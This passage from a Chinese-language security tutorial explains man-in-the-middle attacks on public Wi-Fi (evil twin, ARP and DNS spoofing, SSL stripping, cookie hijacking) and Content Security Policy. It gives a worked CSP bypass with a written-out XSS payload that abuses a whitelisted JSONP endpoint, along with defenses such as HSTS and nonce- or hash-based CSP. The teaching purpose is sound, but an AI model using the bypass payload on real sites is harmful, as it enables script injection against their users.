2. **转发与冒充**：马洛里将原始消息原封不动地转发给鲍勃。此时，鲍勃无法分辨消息是否真的直接来自爱丽丝。鲍勃回应并附上自己的公KEY，这条回应再次被马洛里截获 3。
    
3. **替换与欺骗**：马洛里将消息中的鲍勃公钥替换为自己的公钥，然后将这条篡改后的消息发送给爱丽丝。爱丽丝收到后，误以为这个公钥属于鲍勃 3。
    
4. **解密与操纵**：爱丽丝使用她以为是鲍勃的公钥（实际上是马洛里的）加密了她的敏感信息（例如，“我们在公共汽车站见面！”）并发送。马洛里截获后，用自己的私钥轻松解密，获取了信息。他可以阅读、篡改（例如，改为“我们在码头见面！”），然后用之前截获的、真实的鲍勃公钥重新加密，再发送给鲍勃。
    

整个过程完美展示了中间人攻击的三个关键环节：拦截（Interception）、冒充（Impersonation）和操纵（Manipulation）。通信双方自始至终都以为连接是安全的，但其所有信息都已暴露在攻击者面前。

### 1.2 公共 Wi-Fi：中间人攻击的理想猎场

对于“为何应避免连接公共 Wi-Fi”这一问题，核心答案在于：公共 Wi-Fi 网络，如咖啡馆、机场、酒店等场所提供的服务，其固有的开放性和普遍缺乏强加密的特性，为攻击者实施中间人攻击提供了成本极低且成功率极高的平台 1。

公共 Wi-Fi 的固有漏洞主要体现在以下几个方面：

- **弱安全或无加密**：许多公共 Wi-Fi 热点为了方便用户接入，完全不设置密码，或者仅使用一个公开的、简单的共享密码。这意味着网络流量在空中传输时是未加密的明文，或极易被解密，任何处于同一网络下的设备都能轻易嗅探到这些数据 2。
    
- **开放的接入点**：公共网络的本质决定了任何人都可以连接，这使得攻击者可以轻而易举地与潜在受害者处于同一个局域网（LAN）内。这是实施多种中间人攻击（如 ARP 欺骗）的必要前提 5。
    
- **缺乏接入点身份验证**：用户的设备（如手机或笔记本电脑）通常无法验证所连接的 Wi-Fi 接入点（Access Point, AP）的真实性。攻击者可以利用这一点，发起所谓的“邪恶双胞胎”（Evil Twin）攻击 2。
    

“邪恶双胞胎”攻击是公共 Wi-Fi 环境下最常见也最危险的 MITM 手段之一。攻击者会在一个提供合法 Wi-Fi 的公共场所，设置一个名称（SSID）与合法网络完全相同或极其相似的恶意 Wi-Fi 接入点，例如将合法的 "Starbucks_Free_WiFi" 伪装成 "Starbucks Free WiFi" 6。由于用户的设备可能配置为自动连接到已知的网络，或者用户在手动选择时无法分辨真伪，他们很可能会连接到这个由攻击者控制的恶意热点 8。一旦连接成功，受害者的所有网络流量都将通过攻击者的设备进行转发。此时，攻击者便成为了“中间人”，可以监控、记录、甚至修改所有未加密的流量，从而窃取登录凭据、银行账户信息、信用卡号等高度敏感的数据 2。

### 1.3 关键攻击向量深度分析

中间人攻击并非单一技术，而是涵盖了多个网络层面的攻击向量的统称。

#### 局域网层面：地址解析协议 (ARP) 欺骗

在以太网等局域网中，设备之间通信需要知道对方的物理地址，即 MAC 地址。地址解析协议（ARP）的作用就是将网络层的 IP 地址解析为数据链路层的 MAC 地址。ARP 欺骗（或称 ARP 投毒）的原理是，攻击者向网络中的特定设备（如您的笔记本电脑）或整个局域网广播伪造的 ARP 响应包 7。例如，攻击者会告诉您的电脑：“我是网关（路由器），我的 MAC 地址是 XX:XX:XX:XX:XX:XX（攻击者的 MAC 地址）”，同时告诉网关：“我是您的电脑，我的 MAC 地址是 XX:XX:XX:XX:XX:XX（攻击者的 MAC 地址）”。这会导致受害者的设备将本应发往互联网的数据包全部发送给了攻击者，而网关返回的数据包也同样经由攻击者转发。这样，攻击者就完全控制了通信链路，可以随心所欲地窃听或修改流量 10。这种攻击之所以在公共 Wi-Fi 中尤为有效，正是因为其打破了传统局域网设计时所依赖的“本地网络是可信环境”这一基本假设。公共 Wi-Fi 将大量互不信任的设备置于同一广播域内，为 ARP 欺骗创造了完美的作案条件。

#### 域名解析层面：DNS 欺骗

域名系统（DNS）如同互联网的电话簿，负责将人类易于记忆的域名（如 `www.example.com`）翻译成机器能够识别的 IP 地址。DNS 欺骗（或 DNS 劫持）是指攻击者通过各种手段篡改 DNS 查询的响应，将一个合法的域名指向一个由攻击者控制的恶意服务器的 IP 地址 9。在公共 Wi-Fi 环境中，运营恶意接入点的攻击者可以直接控制其网络内的 DNS 服务器，或者在流量通过时拦截并伪造 DNS 响应。其后果是，即使用户在浏览器地址栏中输入了完全正确的网址，他们也会被悄无声息地重定向到一个外观一模一样的钓鱼网站。一旦用户在该网站上输入用户名、密码或信用卡信息，这些敏感数据就会被攻击者尽收囊中 7。

#### 加密通信的破解：SSL/TLS 攻击

即便是使用了 HTTPS 加密的网站，也并非高枕无忧。攻击者有多种手段来削弱或绕过这层保护。

- **SSL 剥离 (SSL Stripping)**：许多网站为了向后兼容，允许用户通过不安全的 HTTP 发起初始连接，然后服务器再将其重定向到安全的 HTTPS 版本。SSL 剥离攻击就发生在这个重定向的瞬间。攻击者拦截这个重定向请求，对用户伪装成服务器，继续使用不安全的 HTTP 与用户通信；而在另一端，攻击者则与真实的服务器建立起一个完全加密的 HTTPS 连接。对于用户而言，他们可能没有注意到浏览器地址栏的“安全锁”标志消失了，从而在不知不觉中通过明文传输了所有数据 9。
    
- **HTTPS/SSL 欺骗与劫持**：此种攻击中，攻击者会向用户的浏览器提供一个伪造的、不受信任的 SSL 证书。现代浏览器会立即识别出该证书的问题（例如，签发机构不受信任，或域名不匹配），并向用户显示一个严厉的安全警告 2。然而，如果用户选择忽略这个警告并“继续访问”，他们实际上是在授权浏览器与攻击者建立一个“加密”连接。攻击者随后可以解密所有流量，窃取信息后，再与真实服务器建立另一个合法的加密连接 7。这揭示了一个重要的现实：加密技术本身（如 HTTPS）虽然保证了信道的机密性，但它无法保证您所连接的对象的真实性。用户对安全警告的忽视，会使这层技术保护形同虚设。2011 年荷兰证书颁发机构 DigiNotar 遭到的攻击就是一个灾难性的例子，攻击者利用 MITM 渗透并签发了超过 500 个针对谷歌、雅虎等网站的伪造证书，严重动摇了互联网的信任根基 9。
    

#### 会话层攻击：Cookie 窃取与会话劫持

用户成功登录网站后，服务器通常会生成一个包含会话 ID 的 Cookie 并发送给浏览器，以便在后续的请求中识别用户身份，免去重复登录的麻烦。在一个不安全的 Wi-Fi 网络中，如果网站的 Cookie 没有被正确地设置为 `Secure` 属性，那么这个 Cookie 可能会通过未加密的 HTTP 请求发送。MITM 攻击者可以轻易地嗅探并捕获这些会话 Cookie 9。一旦攻击者获得了这个 Cookie，他们就可以将其导入自己的浏览器，从而冒充受害者，劫持其登录会话，直接访问其账户并执行各种操作，而完全不需要知道用户的密码 2。

### 1.4 真实世界案例与防御策略

中间人攻击的威胁并非理论上的空谈，现实世界中已发生多起影响深远的案例。2017 年，信用报告机构 Equifax 因未修补的漏洞遭受攻击，导致近 1.5 亿人的财务信息泄露，其移动应用中的安全缺陷也使用户易受 MITM 攻击 9。2024 年，安全研究人员更是演示了如何通过在特斯拉充电站设置虚假 Wi-Fi 热点来实施 MITM 攻击，最终获取车主凭证，实现对车辆的解锁和启动 9。

面对这些无处不在的威胁，个人和企业都应采取积极的防御策略。

|攻击向量|作用层面|简要机制|用户侧防御策略|服务器/开发者侧防御策略|
|---|---|---|---|---|
|**邪恶双胞胎**|物理/网络层|创建与合法 Wi-Fi 同名或相似的恶意接入点，诱骗用户连接。|避免连接开放 Wi-Fi；核对网络名称；使用 VPN；关闭自动连接功能 2。|（不适用）|
|**ARP 欺骗**|数据链路层|在局域网内发送伪造的 ARP 响应，将流量重定向至攻击者设备。|使用 VPN 加密所有流量；使用静态 ARP 绑定（高级用户）。|企业网络可部署动态 ARP 检测等安全方案。|
|**DNS 欺骗**|网络/应用层|篡改 DNS 响应，将合法域名指向恶意服务器 IP。|使用 VPN（其 DNS 查询通常在加密隧道内）；配置可信的 DNS-over-HTTPS (DoH) 服务。|部署 DNSSEC (域名系统安全扩展)。|
|**SSL 剥离**|应用层|阻止从 HTTP 到 HTTPS 的安全重定向，强制用户使用不安全的连接。|始终验证地址栏为 HTTPS；注意安全锁标志；使用支持 HSTS 的浏览器。|实施 HTTP Strict Transport Security (HSTS) 策略 12。|
|**会话劫持**|应用层|在不安全的网络中嗅探并窃取未加密的会话 Cookie。|避免在公共 Wi-Fi 上进行敏感操作；使用 VPN；确保访问的网站全程使用 HTTPS。|在所有 Cookie 上设置 `Secure` 和 `HttpOnly` 标志。|

**个人用户的核心防御原则**：

- **规避与隔离**：首要原则是尽可能避免使用公共 Wi-Fi，尤其是无需密码的开放网络。使用手机的数据网络（蜂窝网络）是远比公共 Wi-Fi 安全的选择 2。
    
- **加密隧道**：如果必须使用公共 Wi-Fi，务必使用虚拟专用网络（VPN）。VPN 会在您的设备和 VPN 服务器之间建立一个加密隧道，即使您连接到恶意 Wi-Fi，您的所有流量也会被强加密保护，使攻击者无法读取 2。
    
- **验证与警惕**：始终确认您访问的敏感网站（如银行、邮箱）使用了 HTTPS，并密切关注浏览器地址栏的安全锁标志。对任何形式的证书错误警告都应保持高度警惕，绝不轻易点击“继续访问” 2。
    
- **多因素认证 (MFA)**：为您的重要账户启用 MFA。即使您的登录凭据在 MITM 攻击中被盗，MFA 也能提供一道至关重要的额外安全屏障，有效阻止攻击者登录您的账户 2。
    

### 第二部分：内容安全策略 (CSP)：构建抵御 XSS 攻击的铜墙铁壁

### 2.1 CSP 的核心机制：从信任白名单开始

内容安全策略（Content Security Policy, CSP）是一种强大的附加安全层，其主要目标是检测并削弱特定类型的攻击，尤其是跨站脚本攻击（Cross-Site Scripting, XSS）12。XSS 攻击的根源在于，浏览器无条件地信任从服务器获取的内容，并在当前用户的浏览器环境中执行了由攻击者注入的恶意脚本 12。

CSP 通过一个名为 `Content-Security-Policy` 的 HTTP 响应头来工作。这个响应头由网站服务器发送给浏览器，其中定义了一系列规则，明确告知浏览器哪些来源（域）是可信的，从而只允许加载和执行来自这些来源的资源，特别是 JavaScript 脚本 12。

其核心的“白名单”工作机制主要通过 `script-src` 指令实现。服务器可以在该指令中指定一个或多个可执行脚本的来源“白名单”。当一个兼容 CSP 的浏览器收到这个策略后，它会严格遵守。任何来源不在此白名单中的脚本，都将被浏览器阻止执行。这不仅包括外部脚本文件，还包括页面内的内联脚本（`<script>...</script>` 标签内的代码）以及 HTML 事件处理器（如 `onclick="..."`）等高风险的脚本执行方式 12。

例如，一个配置为 `Content-Security-Policy: script-src 'self' https://apis.google.com;` 的策略，意味着浏览器只允许执行来自网站自身域（`'self'`）以及 `apis.google.com` 的脚本。任何试图从其他地方加载的脚本都将被拦截。此外，CSP 的能力远不止于脚本，它还可以通过 `style-src`、`img-src`、`connect-src` 等多种指令，对 CSS 样式表、图片、字体、AJAX 请求等几乎所有类型的页面资源来源进行精细化控制，从而提供全面的内容加载保护 12。

### 2.2 CSP 配置不当：从防线到漏洞

尽管 CSP 功能强大，但错误的配置会使其形同虚设，甚至带来虚假的安全感。一个配置不当的 CSP 策略，完全可能被攻击者巧妙地绕过。以下将构造一个典型的配置不当被绕过的例子。

场景描述：

假设一个网站为了使用某个广受信赖的第三方内容分发网络（CDN）来加速静态资源加载，配置了一个看似安全的 CSP，将该 CDN 的域名添加到了脚本来源的白名单中。

- 不安全的 CSP 配置：
    
    Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
    

**绕过步骤描述**：

1. **发现可利用的端点**：攻击者经过侦察，发现 `https://trusted-cdn.com` 这个被列入白名单的域，提供了一个开放的 JSONP（JSON with Padding）API 端点。JSONP 是一种用于实现跨域数据请求的旧技术，其工作原理是通过动态创建一个 `<script>` 标签，并将一个回调函数名作为 URL 参数传递给服务器。服务器返回的数据会被包裹在这个回调函数中执行。
    
2. **构造恶意 Payload**：攻击者在一个存在 XSS 漏洞的页面（例如，一个允许用户发表评论的论坛）上，注入了一段看似无害的 HTML 代码。这段代码是一个 `<script>` 标签，其 `src` 属性指向了可信 CDN 上的那个 JSONP 接口。关键在于，其 `callback` URL 参数被设置成了一段恶意的 JavaScript 代码。
    
3. **注入并执行绕过**：
    
    - **注入的 HTML**：`<script src="https://trusted-cdn.com/api/jsonp?callback=alert('XSS-Bypassed-CSP')"></script>` 16。
        
    - **浏览器行为**：当用户的浏览器解析到这个 `<script>` 标签时，它会检查其 `src` 属性的来源。
        
    - **CSP 验证**：浏览器发现来源域 `trusted-cdn.com` 存在于 `script-src` 的白名单中，因此判定该脚本是“可信的”，并允许加载和执行。
        
    - **恶意代码执行**：浏览器向该 URL 发起请求。`trusted-cdn.com` 的服务器收到请求后，按 JSONP 规范返回一段 JavaScript 代码，其内容大致为 `alert('XSS-Bypassed-CSP')({"data": "some_data"});`。浏览器接收到这段响应后，会立即将其作为 JavaScript 执行。因此，攻击者注入的 `alert(...)` 函数被成功执行，CSP 的防御被完全绕过。
        

这个绕过之所以能够成功，其根本原因在于基于域的白名单策略存在一个致命的逻辑缺陷，即“白名单谬误”（Whitelist Fallacy）。它基于一个假设：**一个可信的域只会提供可信的内容**。然而，在现代 Web 生态中，这个假设早已不成立。CDN、API 服务、社交媒体小部件等，都可能托管用户生成的内容，或提供像 JSONP 这样可以被滥用以执行任意回调函数的接口 16。这迫使安全模型必须从简单的“基于位置的信任”（Trusting Location）演进到更严格的“基于内容的信任”（Trusting Content）。

### 2.3 构建严格且不可绕过的 CSP

认识到传统 URL 白名单的脆弱性后，现代 CSP 的最佳实践已经转向了更严格、更精确的控制方法，即使用 Nonces 和 Hashes，并配合 `'strict-dynamic'` 关键字。

|不安全的/弱的 CSP 指令|关联风险|安全的替代方案|解释|
|---|---|---|---|
|`script-src *;`|允许来自任何来源的脚本，完全无效。|避免使用通配符 `*`，采用严格的白名单，或最好使用 Nonce/Hash。|最小权限原则，只允许绝对必要的来源。|
|`script-src 'unsafe-inline';`|允许执行内联脚本，为基础 XSS 攻击打开大门。|使用基于 Nonce 或 Hash 的策略来授权特定的内联脚本。|`unsafe-inline` 会使 CSP 对最常见的 XSS 向量失效。|
|`script-src https://*.cdn.com;`|允许来自该 CDN 所有子域的脚本，可能被托管在子域上的恶意内容利用。|明确指定完整的域名；最好结合 Nonce/Hash 和 `'strict-dynamic'` 使用。|通配符扩大了攻击面，违反了最小权限原则。|
|`script-src https://trusted.com;`|信任整个域，易受 JSONP 劫持等白名单绕过攻击。|使用 `'nonce-...'` 或 `'sha256-...'` 配合 `'strict-dynamic'`。|从“信任位置”转向“信任内容”，确保只有开发者预期的脚本被执行。|

#### 基于 Nonce 的 CSP

Nonce（Number used once）方法要求服务器为每一个页面响应生成一个唯一的、加密安全的、不可预测的随机字符串。这个 Nonce 值需要同时被放置在 `Content-Security-Policy` 头的 `script-src` 指令中，以及页面上所有合法的 `<script>` 标签的 `nonce` 属性里 13。

- **CSP 头部**：`Content-Security-Policy: script-src 'nonce-aBcDeF12345' 'strict-dynamic';`
    
- **HTML 脚本**：`<script nonce="aBcDeF12345"> // 合法脚本内容 </script>`
    

在这种模式下，浏览器只会执行那些 `nonce` 属性值与 CSP 头部中声明的 Nonce 完全匹配的脚本。由于攻击者无法预测或获取每次请求生成的随机 Nonce，他们即使能够向页面注入 `<script>` 标签，也因无法提供正确的 Nonce 而被浏览器阻止执行 17。

#### 基于 Hash 的 CSP
对于不涉及服务器端动态渲染的纯静态页面（例如，单页面应用），可以使用基于 Hash 的方法。服务器需要预先计算出页面上所有合法的内联脚本内容的加密哈希值（通常是 SHA256），然后将这些哈希值添加到 `script-src` 指令中 17。

- **CSP 头部**：`Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=';`
    

浏览器在执行任何内联脚本前，会先计算其内容的哈希值，并与 CSP 策略中提供的哈希列表进行比对。只有哈希值完全匹配的脚本才会被执行。任何由攻击者注入的、内容不同的脚本，其哈希值必然不匹配，从而被阻止 17。

#### `'strict-dynamic'` 关键字

`'strict-dynamic'` 是一个强大的补充。当它与 Nonce 或 Hash 一起使用时，它允许一个已经被信任的脚本（即通过 Nonce 或 Hash 验证的脚本）以编程方式动态地创建和加载其他脚本（例如通过 `document.createElement('script')`）。这极大地简化了在大量使用模块加载和代码分割的现代 JavaScript 框架（如 React, Angular）中部署 CSP 的复杂性，同时保持了极高的安全性 16。

### 2.4 部署、测试与监控策略

直接在生产环境中强制执行一个严格的 CSP 极有可能破坏现有网站的功能。因此，必须采用循序渐进的部署、测试与监控策略。这种方法不仅是技术上的最佳实践，更体现了一种主动的安全开发文化，即 CSP 不仅仅是一个被动的拦截器，更是一个引导开发者走向更安全编码模式的“铺路石”（Paved Road）。

首先，应在“仅报告模式”（Report-Only Mode）下开始部署。通过使用 `Content-Security-Policy-Report-Only` 这个响应头，而不是 `Content-Security-Policy`，浏览器将不会实际阻止任何违反策略的行为。相反，它会向一个预先指定的端点发送详细的 JSON 格式违规报告 16。这使得开发者可以在不影响任何用户体验的情况下，全面收集数据，发现并修复所有与新 CSP 策略不兼容的代码，例如遗留的内联事件处理器或不安全的`eval()` 调用。

其次，必须配置报告端点。通过 `report-uri`（已弃用但兼容性好）或更新的 `report-to` 指令，可以指定一个 URL 来接收这些违规报告。对这些报告进行分析，不仅能帮助调试和完善 CSP 策略，还能在策略上线后，作为一种入侵检测系统，实时监控潜在的 XSS 攻击尝试 16。

最后，考虑到向后兼容性，对于无法支持 Nonce/Hash 的老旧浏览器，可以在策略中添加 `'unsafe-inline'` 和宽泛的 URL 白名单作为后备方案。支持现代 CSP 的浏览器在检测到 Nonce 或 Hash 时，会自动忽略 `'unsafe-inline'` 和白名单，从而确保新浏览器获得最强保护，而老浏览器也不会完全瘫痪 16。

## 第三部分：结论：构建纵深防御体系

本次深度分析揭示了中间人攻击和跨站脚本攻击这两种截然不同但又相互关联的网络威胁。中间人攻击主要破坏的是通信信道的完整性和机密性，而 XSS 攻击则破坏了 Web 应用本身在客户端的执行完整性。

一个关键的结论是，这些威胁并非完全孤立。一个成功的中间人攻击可以为 XSS 攻击创造条件。例如，攻击者通过在不安全的公共 Wi-Fi 上实施 SSL 剥离，将用户的连接从安全的 HTTPS 降级为不安全的 HTTP，随后便可以在传输过程中向返回的 HTML 页面中直接注入恶意的 `<script>` 标签，从而在没有服务器端漏洞的情况下触发 XSS 攻击。

因此，构建一个真正有弹性的安全体系，必须摒弃“银弹”思维，采用纵深防御（Defense-in-Depth）的架构。这意味着在多个层面部署互补的安全控制措施：

- **网络与传输层**：作为用户，应养成使用 VPN 保护数据流量的习惯，尤其是在不可信的网络环境中。作为网站开发者和运营者，应强制部署 HSTS（HTTP Strict Transport Security），从根本上杜绝 SSL 剥离攻击，确保通信信道的安全。
    
- **应用层**：开发者必须将安全左移，在编码阶段就采取措施。这包括实施严格的、基于 Nonce/Hash 和 `'strict-dynamic'` 的内容安全策略（CSP），以作为抵御 XSS 的最后一道坚固防线。同时，不能放弃传统的安全措施，如对所有用户输入进行严格的、上下文感知的输出转义。
    
- **用户层**：技术永远无法完全替代人的判断力。提升用户的安全意识至关重要，包括教育用户如何识别钓鱼网站、不点击来路不明的链接，以及最关键的——绝不轻易忽略或绕过浏览器的安全警告。
    

最终，一个安全的数字环境是技术、流程和人员共同努力的结果。从保护网络通信的完整性，到确保 Web 应用代码的安全性，再到培养用户的安全习惯，每一层防御都不可或缺，它们共同构成了一个能够抵御多样化、多维度攻击的健壮防御体系。